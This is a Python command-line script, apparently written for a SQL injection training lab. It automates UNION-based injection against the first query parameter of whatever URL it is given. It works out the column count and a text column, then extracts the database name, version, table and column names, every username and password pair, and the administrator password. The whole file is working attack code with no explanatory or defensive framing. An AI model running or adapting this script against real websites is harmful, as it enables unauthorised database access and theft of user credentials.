#!/usr/bin/env python3
import requests
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

HEADERS = {'User-Agent': 'Mozilla/5.0 (Security-Scanner)'}

def build_url(url, param, value):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    params[param] = [value]
    return urlunparse(parsed._replace(query=urlencode(params, doseq=True)))

def has_error(r):
    if not r:
        return True
    return 'Internal Server Error' in r.text

def find_columns(url, param):
    print(f"\n[*] Finding columns...")
    for i in range(1, 11):
        r = requests.get(build_url(url, param, f"' ORDER BY {i}--"), headers=HEADERS, timeout=15)
        if has_error(r):
            print(f"  [+] Columns: {i-1}")
            return i - 1
    return None

def find_text_column(url, param, num_cols):
    print(f"\n[*] Finding text column...")
    for i in range(num_cols):
        nulls = ['NULL'] * num_cols
        nulls[i] = "'test123'"
        payload = f"' UNION SELECT {','.join(nulls)}--"
        r = requests.get(build_url(url, param, payload), headers=HEADERS, timeout=15)
        if r and 'test123' in r.text:
            print(f"  [+] Text column: {i + 1}")
            return i
    return None

def extract(url, param, num_cols, text_col, query):
    nulls = ['NULL'] * num_cols
    nulls[text_col] = query
    payload = f"' UNION SELECT {','.join(nulls)}--"
    r = requests.get(build_url(url, param, payload), headers=HEADERS, timeout=15)
    if not r or has_error(r):
        return None
    return r.text

def get_expected_string(url, param, num_cols, text_col):
    """يجرب الأداة النص المطلوب"""
    # جرب النصوص الشائعة
    test_strings = ['exeMH2', 'abcdef', 'abc123', 'test', 'hello', 'secret']
    
    for s in test_strings:
        nulls = ['NULL'] * num_cols
        nulls[text_col] = f"'{s}'"
        payload = f"' UNION SELECT {','.join(nulls)}--"
        r = requests.get(build_url(url, param, payload), headers=HEADERS, timeout=15)
        if r and s in r.text and not has_error(r):
            # تأكد إنه ظهر
            if r.text.count(s) > 1 or f'<th>{s}</th>' in r.text or f'>{s}<' in r.text:
                print(f"  [+] String found: {s}")
                return s
    return None

def auto_exploit(url):
    print(f"\n{'='*60}")
    print(f"  SQLi Lab8 Auto-Exploiter")
    print(f"  Target: {url}")
    print(f"{'='*60}")
    
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if not params:
        print("[-] No parameters")
        return
    
    param = list(params.keys())[0]
    print(f"[*] Parameter: {param}")
    
    num_cols = find_columns(url, param)
    if not num_cols:
        return
    
    text_col = find_text_column(url, param, num_cols)
    if text_col is None:
        return
    
    print(f"\n{'='*60}")
    print(f"  EXTRACTION")
    print(f"{'='*60}")
    
    # جرب النص المطلوب
    result = get_expected_string(url, param, num_cols, text_col)
    if result:
        print(f"\n  [+] SUCCESS: {result}")
    else:
        print(f"\n  [-] Could not find the required string")
    
    # جرب استخراج البيانات
    queries = [
        ('Database', 'database()'),
        ('Version', 'version()'),
        ('Tables', "(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())"),
        ('Users Columns', "(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users')"),
        ('Credentials', "(SELECT GROUP_CONCAT(username,':',password) FROM users)"),
        ('Admin Pwd', "(SELECT password FROM users WHERE username='administrator')"),
    ]
    
    for name, query in queries:
        html = extract(url, param, num_cols, text_col, query)
        if html:
            # ابحث عن أي نص في <th> أو <td>
            matches = re.findall(r'<th[^>]*>([^<]+)</th>|<td[^>]*>([^<]+)</td>', html)
            found = False
            for m in matches:
                val = (m[0] or m[1]).strip()
                if val and val != 'NULL' and len(val) < 200:
                    print(f"  [+] {name}: {val}")
                    found = True
                    break
            if not found:
                print(f"  [-] {name}: no result")

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python3 sqli_lab8.py <url>")
        sys.exit(1)
    auto_exploit(sys.argv[1])
